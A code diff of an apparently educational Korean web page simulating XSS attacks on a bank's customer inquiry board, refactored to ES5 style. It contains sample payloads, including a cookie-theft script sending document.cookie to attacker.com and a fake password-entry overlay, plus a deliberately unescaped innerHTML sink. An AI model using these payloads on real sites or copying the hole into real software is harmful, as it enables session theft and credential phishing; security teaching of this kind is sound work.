@@ -39,7 +39,7 @@
                     <div class="flex items-center gap-3">
                         <i class="fas fa-building-columns text-2xl"></i>
                         <div>
-                            <h2 class="text-xl font-bold">KB국민은행</h2>
+                            <h2 class="text-xl font-bold">OO은행</h2>
                             <p class="text-sm">인터넷뱅킹 게시판 시스템</p>
                         </div>
                     </div>
@@ -61,7 +61,7 @@
                            value="김철수">
                     
                     <label class="block text-sm font-bold mb-2">문의 내용</label>
-                    <textarea id="xss-input" 
+                    <textarea id="xssInput" 
                               class="w-full h-32 p-2 border border-gray-300 rounded mb-3"
                               placeholder="문의하실 내용을 입력하세요">계좌이체가 안됩니다.</textarea>
                     
@@ -84,19 +84,19 @@
                         XSS 공격 시나리오
                     </h3>
                     <div class="space-y-2">
-                        <button onclick="setPayload('stored')" 
+                        <button onclick="setPayload(1)" 
                                 class="w-full text-left bg-red-900 hover:bg-red-800 px-3 py-2 rounded text-sm">
                             <i class="fas fa-database"></i> 시나리오 1: Stored XSS
                         </button>
-                        <button onclick="setPayload('reflected')" 
+                        <button onclick="setPayload(2)" 
                                 class="w-full text-left bg-orange-900 hover:bg-orange-800 px-3 py-2 rounded text-sm">
                             <i class="fas fa-link"></i> 시나리오 2: Reflected XSS
                         </button>
-                        <button onclick="setPayload('cookie')" 
+                        <button onclick="setPayload(3)" 
                                 class="w-full text-left bg-purple-900 hover:bg-purple-800 px-3 py-2 rounded text-sm">
                             <i class="fas fa-cookie-bite"></i> 시나리오 3: 쿠키 탈취
                         </button>
-                        <button onclick="setPayload('phishing')" 
+                        <button onclick="setPayload(4)" 
                                 class="w-full text-left bg-yellow-900 hover:bg-yellow-800 px-3 py-2 rounded text-sm">
                             <i class="fas fa-fish-fins"></i> 시나리오 4: 피싱 페이지
                         </button>
@@ -135,7 +135,7 @@
                         <h3 class="font-bold">
                             <i class="fas fa-browser"></i> 브라우저 실행 결과
                         </h3>
-                        <span id="status-badge" class="text-xs bg-green-500 text-gray-900 px-3 py-1 rounded">
+                        <span id="statusBadge" class="text-xs bg-green-500 text-gray-900 px-3 py-1 rounded">
                             대기중
                         </span>
                     </div>
@@ -262,56 +262,64 @@
     </div>
 
     <script>
-        const payloads = {
-            stored: `<script>alert('XSS 공격! 쿠키: ' + document.cookie)</script>`,
-            reflected: `<img src=x onerror="alert('Reflected XSS')">`,
-            cookie: `<script>
-fetch('http://attacker.com/steal?cookie=' + document.cookie);
-</script>`,
-            phishing: `<div id="phishingOverlay" onclick="if(event.target.id==='phishingOverlay')this.remove()" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;padding:50px;cursor:pointer">
-<div style="max-width:400px;margin:auto;background:white;border:2px solid red;padding:30px;border-radius:10px;position:relative;cursor:default">
-<button onclick="document.getElementById('phishingOverlay').remove();event.stopPropagation()" style="position:absolute;top:10px;right:10px;background:red;color:white;border:none;width:30px;height:30px;border-radius:50%;cursor:pointer;font-size:18px;font-weight:bold">×</button>
-<h2 style="color:red;text-align:center;margin-bottom:15px">🔒 보안 인증 필요</h2>
-<p style="text-align:center;margin-bottom:20px">본인 확인을 위해<br>비밀번호를 다시 입력해주세요</p>
-<input type="password" style="width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;box-sizing:border-box" placeholder="비밀번호">
-<button style="width:100%;padding:10px;background:#0066cc;color:white;border:none;border-radius:5px;margin-bottom:10px;cursor:pointer">확인</button>
-<div style="background:#fff3cd;border:1px solid #ffc107;padding:10px;border-radius:5px;margin-top:15px">
-<p style="text-align:center;color:red;font-size:12px;font-weight:bold;margin:5px 0">⚠️ 이것은 XSS 공격 시뮬레이션입니다</p>
-<p style="text-align:center;color:#856404;font-size:11px;margin:5px 0">실제로는 가짜 로그인 폼 (피싱)</p>
-<p style="text-align:center;color:gray;font-size:10px;margin:5px 0">닫으려면: X 버튼 클릭 또는 배경 클릭</p>
-</div>
-</div>
-</div>`
-        };
+        function getPayload(type) {
+            if (type === 1) {
+                return "<script>alert('XSS 공격! 쿠키: ' + document.cookie)<\/script>";
+            } else if (type === 2) {
+                return '<img src=x onerror="alert(\'Reflected XSS\')">';
+            } else if (type === 3) {
+                return "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie);<\/script>";
+            } else if (type === 4) {
+                var phishingHTML = '';
+                phishingHTML += '<div id="phishingOverlay" onclick="if(event.target.id===\'phishingOverlay\')this.remove()" ';
+                phishingHTML += 'style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);';
+                phishingHTML += 'z-index:9999;padding:50px;cursor:pointer">';
+                phishingHTML += '<div style="max-width:400px;margin:auto;background:white;border:2px solid red;';
+                phishingHTML += 'padding:30px;border-radius:10px;position:relative;cursor:default">';
+                phishingHTML += '<button onclick="document.getElementById(\'phishingOverlay\').remove();event.stopPropagation()" ';
+                phishingHTML += 'style="position:absolute;top:10px;right:10px;background:red;color:white;border:none;';
+                phishingHTML += 'width:30px;height:30px;border-radius:50%;cursor:pointer;font-size:18px;font-weight:bold">×</button>';
+                phishingHTML += '<h2 style="color:red;text-align:center;margin-bottom:15px">🔒 보안 인증 필요</h2>';
+                phishingHTML += '<p style="text-align:center;margin-bottom:20px">본인 확인을 위해<br>비밀번호를 다시 입력해주세요</p>';
+                phishingHTML += '<input type="password" style="width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;';
+                phishingHTML += 'box-sizing:border-box" placeholder="비밀번호">';
+                phishingHTML += '<button style="width:100%;padding:10px;background:#0066cc;color:white;border:none;';
+                phishingHTML += 'border-radius:5px;margin-bottom:10px;cursor:pointer">확인</button>';
+                phishingHTML += '<div style="background:#fff3cd;border:1px solid #ffc107;padding:10px;border-radius:5px;margin-top:15px">';
+                phishingHTML += '<p style="text-align:center;color:red;font-size:12px;font-weight:bold;margin:5px 0">⚠️ XSS 공격 시뮬레이션</p>';
+                phishingHTML += '<p style="text-align:center;color:#856404;font-size:11px;margin:5px 0">가짜 로그인 폼 (피싱)</p>';
+                phishingHTML += '<p style="text-align:center;color:gray;font-size:10px;margin:5px 0">닫기: X 버튼 또는 배경 클릭</p>';
+                phishingHTML += '</div></div></div>';
+                return phishingHTML;
+            }
+            return '';
+        }
 
         function resetInput() {
             document.getElementById('customerName').value = '김철수';
-            document.getElementById('xss-input').value = '계좌이체가 안됩니다.';
-            document.getElementById('browserView').innerHTML = `
-                <div class="text-center text-gray-400 py-10">
-                    <i class="fas fa-browser text-5xl mb-3 opacity-30"></i>
-                    <p class="text-sm">게시글이 표시됩니다</p>
-                </div>
-            `;
+            document.getElementById('xssInput').value = '계좌이체가 안됩니다.';
+            document.getElementById('browserView').innerHTML = 
+                '<div class="text-center text-gray-400 py-10">' +
+                '<i class="fas fa-browser text-5xl mb-3 opacity-30"></i>' +
+                '<p class="text-sm">게시글이 표시됩니다</p></div>';
             document.getElementById('attackStages').classList.add('hidden');
             document.getElementById('terminalBox').classList.add('hidden');
             document.getElementById('judgementBox').classList.add('hidden');
             document.getElementById('damageBox').classList.add('hidden');
-            document.getElementById('status-badge').textContent = '대기중';
-            document.getElementById('status-badge').className = 'text-xs bg-green-500 text-gray-900 px-3 py-1 rounded';
+            document.getElementById('statusBadge').textContent = '대기중';
+            document.getElementById('statusBadge').className = 'text-xs bg-green-500 text-gray-900 px-3 py-1 rounded';
         }
 
         function setPayload(type) {
-            document.getElementById('xss-input').value = payloads[type];
+            document.getElementById('xssInput').value = getPayload(type);
         }
 
         async function submitVulnerable() {
-            const name = document.getElementById('customerName').value;
-            const content = document.getElementById('xss-input').value;
-            const browserView = document.getElementById('browserView');
-            const badge = document.getElementById('status-badge');
+            var name = document.getElementById('customerName').value;
+            var content = document.getElementById('xssInput').value;
+            var browserView = document.getElementById('browserView');
+            var badge = document.getElementById('statusBadge');
             
-            // 초기화
             document.getElementById('attackStages').classList.add('hidden');
             document.getElementById('terminalBox').classList.add('hidden');
             document.getElementById('terminalLines').innerHTML = '';
@@ -320,20 +328,23 @@ fetch('http://attacker.com/steal?cookie=' + document.cookie);
 
             badge.textContent = '처리중...';
             badge.className = 'text-xs bg-yellow-500 text-gray-900 px-3 py-1 rounded';
-            browserView.innerHTML = '<div class="text-center text-blue-500 py-10"><i class="fas fa-spinner fa-spin text-4xl"></i><p class="mt-3">게시글 등록 중...</p></div>';
+            browserView.innerHTML = '<div class="text-center text-blue-500 py-10">' +
+                '<i class="fas fa-spinner fa-spin text-4xl"></i>' +
+                '<p class="mt-3">게시글 등록 중...</p></div>';
             
             await sleep(800);
 
-            const isXSS = content.includes('<script>') || content.includes('onerror=') || content.includes('onload=') || content.includes('<img') || content.includes('<iframe');
+            var isXSS = content.indexOf('<script>') !== -1 || 
+                        content.indexOf('onerror=') !== -1 || 
+                        content.indexOf('<img') !== -1 ||
+                        content.indexOf('<div') !== -1;
 
             if (isXSS) {
-                // 공격 감지
                 document.getElementById('attackStages').classList.remove('hidden');
-                document.getElementById('stagesContent').innerHTML = `
-                    <div>1. 악성 스크립트 포함된 게시글 등록</div>
-                    <div>2. DB에 스크립트가 그대로 저장</div>
-                    <div>3. 다른 사용자 조회 시 스크립트 실행</div>
-                `;
+                document.getElementById('stagesContent').innerHTML = 
+                    '<div>1. 악성 스크립트 포함된 게시글 등록</div>' +
+                    '<div>2. DB에 스크립트가 그대로 저장</div>' +
+                    '<div>3. 다른 사용자 조회 시 스크립트 실행</div>';
 
                 document.getElementById('terminalBox').classList.remove('hidden');
                 addTerminalLine('> XSS 페이로드 탐지');
@@ -341,75 +352,52 @@ fetch('http://attacker.com/steal?cookie=' + document.cookie);
                 addTerminalLine('> 입력값 필터링 없음');
                 await sleep(500);
 
-                if (content.includes('document.cookie')) {
+                if (content.indexOf('document.cookie') !== -1) {
                     addTerminalLine('> [!] 쿠키 탈취 시도!', 'text-red-400');
                     
-                    browserView.innerHTML = `
-                        <div class="border-l-4 border-red-500 bg-red-50 p-4">
-                            <div class="flex items-center gap-2 mb-3">
-                                <strong>${escapeHtml(name)}</strong>
-                                <span class="text-xs text-gray-500">2024-12-08</span>
-                            </div>
-                            <div class="mb-3">${content}</div>
-                            <div class="bg-red-900 text-red-100 p-3 rounded text-xs">
-                                <div class="font-bold">⚠️ XSS 공격 실행 중...</div>
-                                <div>쿠키 탈취: JSESSIONID=7A8F9B...</div>
-                                <div>전송: http://attacker.com/steal</div>
-                            </div>
-                        </div>
-                    `;
+                    browserView.innerHTML = 
+                        '<div class="border-l-4 border-red-500 bg-red-50 p-4">' +
+                        '<div class="flex items-center gap-2 mb-3">' +
+                        '<strong>' + escapeHtml(name) + '</strong>' +
+                        '<span class="text-xs text-gray-500">2024-12-08</span></div>' +
+                        '<div class="mb-3">' + content + '</div>' +
+                        '<div class="bg-red-900 text-red-100 p-3 rounded text-xs">' +
+                        '<div class="font-bold">⚠️ XSS 공격 실행 중...</div>' +
+                        '<div>쿠키 탈취: JSESSIONID=7A8F9B...</div>' +
+                        '<div>전송: http://attacker.com/steal</div></div></div>';
                     
                     await sleep(1000);
                     addTerminalLine('> 세션 쿠키 탈취 완료!', 'text-red-400');
                     
-                } else if (content.includes('position:fixed')) {
+                } else if (content.indexOf('position:fixed') !== -1 || content.indexOf('phishingOverlay') !== -1) {
                     addTerminalLine('> [!] 피싱 페이지 삽입!', 'text-red-400');
-                    
-                    browserView.innerHTML = `
-                        <div class="border-l-4 border-red-500 bg-red-50 p-4">
-                            <div class="flex items-center gap-2 mb-3">
-                                <strong>${escapeHtml(name)}</strong>
-                            </div>
-                            <div>${content}</div>
-                        </div>
-                    `;
-                    
+                    browserView.innerHTML = content;
                     await sleep(1000);
                     addTerminalLine('> 가짜 로그인 폼 표시', 'text-red-400');
                     
-                } else if (content.includes('onerror=')) {
+                } else if (content.indexOf('onerror=') !== -1) {
                     addTerminalLine('> [!] Reflected XSS!', 'text-red-400');
+                    browserView.innerHTML = 
+                        '<div class="border-l-4 border-orange-500 bg-orange-50 p-4">' +
+                        '<div class="flex items-center gap-2 mb-3">' +
+                        '<strong>' + escapeHtml(name) + '</strong></div>' +
+                        '<div>' + content + '</div>' +
+                        '<div class="mt-3 bg-orange-900 text-orange-100 p-2 rounded text-xs">' +
+                        '⚠️ onerror 이벤트 실행!</div></div>';
                     
-                    browserView.innerHTML = `
-                        <div class="border-l-4 border-orange-500 bg-orange-50 p-4">
-                            <div class="flex items-center gap-2 mb-3">
-                                <strong>${escapeHtml(name)}</strong>
-                            </div>
-                            <div>${content}</div>
-                            <div class="mt-3 bg-orange-900 text-orange-100 p-2 rounded text-xs">
-                                ⚠️ onerror 이벤트 실행!
-                            </div>
-                        </div>
-                    `;
-                    
-                    setTimeout(() => alert('Reflected XSS - 스크립트 실행!'), 500);
+                    setTimeout(function() { alert('Reflected XSS - 스크립트 실행!'); }, 500);
                     
                 } else {
                     addTerminalLine('> [!] Stored XSS!', 'text-red-400');
+                    browserView.innerHTML = 
+                        '<div class="border-l-4 border-red-500 bg-red-50 p-4">' +
+                        '<div class="flex items-center gap-2 mb-3">' +
+                        '<strong>' + escapeHtml(name) + '</strong></div>' +
+                        '<div>' + content + '</div>' +
+                        '<div class="mt-3 bg-red-900 text-red-100 p-2 rounded text-xs">' +
+                        '⚠️ XSS 스크립트 실행!</div></div>';
                     
-                    browserView.innerHTML = `
-                        <div class="border-l-4 border-red-500 bg-red-50 p-4">
-                            <div class="flex items-center gap-2 mb-3">
-                                <strong>${escapeHtml(name)}</strong>
-                            </div>
-                            <div>${content}</div>
-                            <div class="mt-3 bg-red-900 text-red-100 p-2 rounded text-xs">
-                                ⚠️ XSS 스크립트 실행!
-                            </div>
-                        </div>
-                    `;
-                    
-                    setTimeout(() => alert('XSS 공격! 악성 코드 실행!'), 500);
+                    setTimeout(function() { alert('XSS 공격! 악성 코드 실행!'); }, 500);
                 }
 
                 badge.textContent = 'XSS 공격';
@@ -418,21 +406,16 @@ fetch('http://attacker.com/steal?cookie=' + document.cookie);
                 document.getElementById('judgementBox').classList.remove('hidden');
                 document.getElementById('judgement').innerHTML = '<span class="text-red-400">취약</span>';
                 document.getElementById('evidence').textContent = '입력값 필터링 없음';
-                
                 document.getElementById('damageBox').classList.remove('hidden');
 
             } else {
-                // 정상
-                browserView.innerHTML = `
-                    <div class="border-l-4 border-blue-500 bg-blue-50 p-4">
-                        <div class="flex items-center gap-2 mb-3">
-                            <i class="fas fa-user text-blue-600"></i>
-                            <strong>${escapeHtml(name)}</strong>
-                            <span class="text-xs text-gray-500">2024-12-08</span>
-                        </div>
-                        <div>${escapeHtml(content)}</div>
-                    </div>
-                `;
+                browserView.innerHTML = 
+                    '<div class="border-l-4 border-blue-500 bg-blue-50 p-4">' +
+                    '<div class="flex items-center gap-2 mb-3">' +
+                    '<i class="fas fa-user text-blue-600"></i>' +
+                    '<strong>' + escapeHtml(name) + '</strong>' +
+                    '<span class="text-xs text-gray-500">2024-12-08</span></div>' +
+                    '<div>' + escapeHtml(content) + '</div></div>';
 
                 badge.textContent = '200 OK';
                 badge.className = 'text-xs bg-green-500 text-gray-900 px-3 py-1 rounded';
@@ -444,20 +427,22 @@ fetch('http://attacker.com/steal?cookie=' + document.cookie);
         }
 
         function escapeHtml(text) {
-            const div = document.createElement('div');
+            var div = document.createElement('div');
             div.textContent = text;
             return div.innerHTML;
         }
 
-        function addTerminalLine(text, color = 'text-green-400') {
-            const div = document.createElement('div');
-            div.className = color;
+        function addTerminalLine(text, color) {
+            var div = document.createElement('div');
+            div.className = color || 'text-green-400';
             div.textContent = text;
             document.getElementById('terminalLines').appendChild(div);
         }
 
         function sleep(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
+            return new Promise(function(resolve) {
+                setTimeout(resolve, ms);
+            });
         }
     </script>
 </body>
